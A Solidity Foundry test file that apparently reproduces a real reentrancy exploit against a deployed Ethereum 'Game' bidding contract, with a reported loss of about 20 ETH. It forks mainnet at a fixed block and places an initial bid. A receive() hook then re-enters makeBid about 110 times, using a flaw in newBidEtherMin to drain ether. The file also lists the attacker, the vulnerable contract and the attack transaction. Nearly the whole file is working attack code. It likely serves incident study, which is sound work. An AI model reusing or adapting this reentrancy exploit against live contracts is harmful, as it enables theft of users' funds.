// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~20 ETH
// Attacker : https://etherscan.io/address/0x145766a51ae96e69810fe76f6f68fd0e95675a0b
// Attack Contract : https://etherscan.io/address/0x8d4de2bc1a566b266bd4b387f62c21e15474d12a
// Vuln Contract : https://etherscan.io/address/0x52d69c67536f55efefe02941868e5e762538dbd6
// Attack Tx : https://phalcon.blocksec.com/explorer/tx/eth/0x0eb8f8d148508e752d9643ccf49ac4cb0c21cbad346b5bbcf2d06974d31bd5c4

// @Analysis
// https://twitter.com/AnciliaInc/status/1757533144033739116

interface IGame {
    function newBidEtherMin() external view returns (uint256);

    function makeBid() external payable;
}

contract ContractTest is Test {
    IGame private constant Game =
        IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6);
    uint8 private reentrancyCalls;

    function setUp() public {
        vm.createSelectFork("mainnet", 19213946);
        vm.label(address(Game), "Game");
    }

    function testExploit() public {
        // Start with 0.6 Ether balance
        deal(address(this), 0.6 ether);
        emit log_named_decimal_uint(
            "Exploiter ETH balance before attack",
            address(this).balance,
            18
        );

        // Following amount will be returned multiple times in receive() function when exploiter make the bad bid
        uint256 bid = (address(this).balance * 49) / 100;
        Game.makeBid{value: bid}();

        makeBadBid();

        emit log_named_decimal_uint(
            "Exploiter ETH balance after attack",
            address(this).balance,
            18
        );
    }

    receive() external payable {
        if (reentrancyCalls <= 109) {
            ++reentrancyCalls;
            makeBadBid();
        } else {
            return;
        }
    }

    function makeBadBid() internal {
        // newBidEtherMin() has logic error and thanks to this exploiter can bypass the require statement in makeBid()
        // require(msg.value > newBidEtherMin(), "bid is too low");
        uint256 badBid = Game.newBidEtherMin() + 1; // +1 because "bid is too low"
        Game.makeBid{value: badBid}();
    }
}
